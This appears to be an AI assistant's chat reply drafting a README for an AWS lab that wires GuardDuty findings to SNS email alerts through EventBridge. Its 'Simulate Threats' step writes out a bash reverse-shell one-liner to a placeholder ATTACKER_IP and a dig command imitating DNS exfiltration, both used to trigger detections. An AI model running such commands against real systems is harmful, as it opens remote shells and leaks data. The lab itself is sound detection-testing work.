Here’s a ready-to-use **GitHub project README** for your **GuardDuty + EC2 + SNS Alert Simulation** project. You can paste this directly into a new repository (`README.md`) on GitHub:

# 🛡️ AWS GuardDuty Threat Detection Project

## 📌 Project Overview

This project demonstrates how to simulate and detect suspicious behavior on an EC2 instance using **Amazon GuardDuty**, and send real-time alerts to an email via **SNS (Simple Notification Service)**.

You will:
- Deploy an EC2 instance with simulated vulnerabilities
- Enable GuardDuty for threat detection
- Trigger test findings and real behavior (DNS exfiltration, reverse shell)
- Use EventBridge to forward GuardDuty alerts to SNS
- Receive alerts via email

## 🚀 Steps to Deploy

### 1. Launch EC2 Instance
- AMI: Amazon Linux 2 or 2023
- Instance Type: t2.micro
- Enable SSH and optionally HTTP/HTTPS in the Security Group
- Add this User Data (for Java setup):
```bash
#!/bin/bash
dnf install -y java-17-amazon-corretto
````

### 2. Simulate Threats on EC2

SSH into the instance and run:

```bash
# Simulate DNS exfiltration
dig $(uuidgen).yourdomain.com

# Simulate reverse shell (for test only)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

### 3. Enable GuardDuty

* Go to **Amazon GuardDuty** > Enable
* GuardDuty will begin monitoring for suspicious behavior

---

### 4. Create an SNS Topic

* Name: `GuardDutyAlerts`
* Subscribe your email (Confirm via email)

---

### 5. Setup EventBridge Rule

* Service: `aws.guardduty`
* Event type: `GuardDuty Finding`
* Target: SNS Topic `GuardDutyAlerts`

---

### 6. Generate Sample Findings (Optional)

```bash
aws guardduty list-detectors
aws guardduty create-sample-findings --detector-id <detector-id>
```

---

## 📧 Example Alert Email

You’ll receive an email like this when a finding occurs:

```json
{
  "source": "aws.guardduty",
  "detail-type": "GuardDuty Finding",
  "detail": {
    "type": "Recon:EC2/PortScan",
    "severity": 5,
    "resource": {
      "instanceDetails": {
        "instanceId": "i-xxxxxx"
      }
    }
  }
}
```

---

## 🧠 Learnings

* GuardDuty detects behavior, not vulnerabilities
* SNS + EventBridge is ideal for automated alerting
* Simulated attacks help test detection pipelines safely

## 🛡️ Security Note

> All simulations were conducted in a secure, isolated AWS environment with no real malware or external C2 communication. Never use real attacks in production accounts.

Would you like me to generate the folder structure and shell scripts too (`ec2-userdata.sh`, etc.)?
